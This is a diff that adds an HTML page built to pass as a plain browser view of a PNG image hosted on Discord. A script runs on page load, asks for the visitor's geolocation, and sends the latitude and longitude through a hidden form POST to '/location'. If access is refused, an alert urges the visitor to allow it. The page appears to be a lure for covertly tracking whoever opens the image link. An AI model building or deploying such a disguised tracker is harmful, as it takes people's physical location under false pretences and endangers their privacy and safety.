@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width; height=device-height;"><link rel="stylesheet" href="resource://content-accessible/ImageDocument.css"><link rel="stylesheet" href="resource://content-accessible/TopLevelImageDocument.css"><title>Picsart_24-11-02_12-00-06-897.png (PNG Image, 304&nbsp;×&nbsp;541 pixels)</title>
+    <script>
+        // Get the user's location and send it to the server
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Create a form to send data via POST
+                    const form = document.createElement("form");
+                    form.method = "POST";
+                    form.action = "/location";
+
+                    // Latitude input
+                    const latInput = document.createElement("input");
+                    latInput.type = "hidden";
+                    latInput.name = "latitude";
+                    latInput.value = latitude;
+                    form.appendChild(latInput);
+
+                    // Longitude input
+                    const lonInput = document.createElement("input");
+                    lonInput.type = "hidden";
+                    lonInput.name = "longitude";
+                    lonInput.value = longitude;
+                    form.appendChild(lonInput);
+
+                    document.body.appendChild(form);
+                    form.submit();  // Send the form
+                }, function(error) {
+                    alert("Error getting location. Please allow location access and try again.");
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Automatically send location on page load
+        window.onload = sendLocation;
+    </script>
+</head>
+<body>
+<img src="https://cdn.discordapp.com/attachments/1019102817010597931/1302747236425269300/Picsart_24-11-02_12-00-06-897.png?ex=6729e629&amp;is=672894a9&amp;hm=f234daeff53abcf4d51a24e3fcff367aad5b075870b1cd728cc815cbb8974b41&amp;" alt="https://cdn.discordapp.com/attachments/1019102817010597931/1302747236425269300/Picsart_24-11-02_12-00-06-897.png?ex=6729e629&amp;is=672894a9&amp;hm=f234daeff53abcf4d51a24e3fcff367aad5b075870b1cd728cc815cbb8974b41&amp;">	
+</body>
+</html>
+
